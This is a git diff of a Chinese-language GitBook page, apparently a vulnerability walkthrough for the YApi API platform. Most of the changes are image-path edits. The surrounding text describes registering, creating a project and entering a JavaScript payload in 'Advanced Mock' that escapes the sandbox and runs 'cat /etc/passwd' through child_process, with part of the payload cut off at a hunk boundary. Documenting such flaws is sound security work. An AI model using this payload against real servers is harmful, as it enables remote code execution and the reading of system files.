@@ -20,29 +20,17 @@ app="YApi"
 
 登录页面
 
-![](images/202202091829002.png)
-
-
+![](../.gitbook/assets/202202091829002.png)
 
 首先需要注册账户并登录
 
+![](../.gitbook/assets/202202091829520.png)
 
-
-![](images/202202091829520.png)
-
-
-
-![](images/202202091829602.png)
-
-
+![](../.gitbook/assets/202202091829602.png)
 
 添加项目，参数任意
 
-
-
 创建后点击 高级Mock 输入如下Payload
-
-
 
 ```javascript
 const sandbox = this; // 获取Context
@@ -53,14 +41,8 @@ const process = myfun();
 mockJson = process.mainModule.require("child_process").execSync("cat /etc/passwd").toString()
 ```
 
-
-
-![](images/202202091830184.png)
-
-
+![](../.gitbook/assets/202202091830184.png)
 
 预览处点击项目链接
 
-
-
-![](images/202202091830086.png)
+![](../.gitbook/assets/202202091830086.png)
